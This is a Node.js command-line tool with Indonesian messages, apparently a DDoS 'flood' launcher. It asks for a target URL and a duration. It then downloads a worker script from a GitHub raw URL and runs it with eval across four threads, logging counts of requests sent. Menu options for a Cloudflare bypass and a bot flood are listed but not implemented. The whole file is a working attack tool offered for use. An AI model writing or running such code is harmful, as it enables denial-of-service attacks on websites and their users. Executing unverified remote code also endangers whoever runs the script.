const readline = require("readline");
const os = require("os");
const https = require("https");
const { Worker } = require("worker_threads");

const WORKER_URL = "https://raw.githubusercontent.com/notswe/freon/main/worker.js";

// Ambil IP publik
function getPublicIP(callback) {
  https.get("https://api.ipify.org?format=json", (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => {
      try {
        const ip = JSON.parse(data).ip;
        callback(ip);
      } catch {
        callback("Tidak diketahui");
      }
    });
  }).on("error", () => {
    callback("Gagal mengambil IP");
  });
}

// Ambil worker.js dari GitHub
function fetchWorkerScript(callback) {
  https.get(WORKER_URL, (res) => {
    let data = "";
    res.on("data", chunk => data += chunk);
    res.on("end", () => callback(null, data));
  }).on("error", err => callback(err, null));
}

// Jalankan flood dengan isi worker.js dari GitHub
function runRemoteWorkers(target, duration, thread = 4) {
  fetchWorkerScript((err, script) => {
    if (err) {
      console.error("Gagal mengambil worker.js:", err.message);
      return;
    }

    console.log(`[✓] Berhasil ambil worker.js dari GitHub`);
    console.log(`[!] Menjalankan ${thread} thread...\n`);

    for (let i = 0; i < thread; i++) {
      const worker = new Worker(`
        const { parentPort, workerData } = require('worker_threads');
        ${script}
      `, {
        eval: true,
        workerData: { target, duration }
      });

      worker.on("message", msg => {
        if (msg.done) {
          console.log(`[✓] Worker selesai | Total=${msg.total} | Sukses=${msg.success} | Gagal=${msg.failed}`);
        } else {
          console.log(`[+] Worker log | Terkirim=${msg.total} | Sukses=${msg.success} | Gagal=${msg.failed}`);
        }
      });

      worker.on("error", err => {
        console.error(`[!] Worker error: ${err.message}`);
      });
    }
  });
}

// Menu
function showMenu(ip) {
  const platform = os.platform();
  const deviceType = /android/.test(platform) ? "Android/Termux" : platform;

  console.clear();
  console.log("==============================");
  console.log("     TOOLS JS INFORMATION     ");
  console.log("==============================");
  console.log("IP Address  :", ip);
  console.log("Device      :", deviceType);
  console.log("==============================");
  console.log("1. Mode Flood");
  console.log("2. Bypass Cloudflare");
  console.log("3. Bot Flood");
  console.log("0. Exit");
  console.log("==============================");

  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
  });

  rl.question("Pilih mode: ", (input) => {
    switch (input) {
      case '1':
        rl.question("Target URL: ", (url) => {
          rl.question("Durasi (detik): ", (time) => {
            runRemoteWorkers(url, parseInt(time), 4);
            rl.close();
          });
        });
        break;

      case '2':
        console.log("Mode CF Bypass belum tersedia.");
        rl.close();
        break;

      case '3':
        console.log("Mode Bot Flood belum tersedia.");
        rl.close();
        break;

      case '0':
        console.log("Keluar...");
        rl.close();
        break;

      default:
        console.log("Pilihan tidak valid.");
        rl.close();
    }
  });
}

// Jalankan
getPublicIP((ip) => {
  showMenu(ip);
});